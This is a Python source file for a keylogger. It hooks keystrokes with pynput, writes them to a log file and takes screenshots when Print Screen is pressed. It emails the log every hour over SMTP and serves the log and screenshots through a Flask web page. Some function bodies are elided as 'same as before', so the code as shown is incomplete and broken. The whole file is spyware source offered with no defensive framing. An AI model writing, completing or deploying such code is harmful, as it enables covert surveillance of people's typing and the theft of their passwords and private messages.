import os
import platform
from flask import Flask, render_template, send_from_directory
from pynput import keyboard
import time
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

app = Flask(__name__)

log_file = 'keystrokes_log.txt'
screenshot_folder = 'screenshots/'
email_interval = 3600  # Send email every 1 hour
screenshot_key = keyboard.Key.print_screen
last_email_time = time.time()

current_word = ""
current_line = ""

def on_key_press(key):
    global current_word, current_line

    # ... (same as before)

    if len(current_line) >= 50:
        save_current_line()

    if key == screenshot_key:
        capture_screenshot()

    if time.time() - last_email_time > email_interval:
        send_email(log_file)
        last_email_time = time.time()

def send_email(attachment_path):
    # ... (same as before)

@app.route('/')
def index():
    # Read and display the keystrokes log
    with open(log_file, 'r') as f:
        keystrokes_log = f.read()
    return render_template('index.html', keystrokes_log=keystrokes_log)

@app.route('/screenshots/<path:filename>')
def download_screenshot(filename):
    return send_from_directory(screenshot_folder, filename)

if __name__ == '__main__':
    key_listener = keyboard.Listener(on_press=on_key_press)
    key_listener.start()
    app.run(debug=True)  # Run the Flask app in debug mode
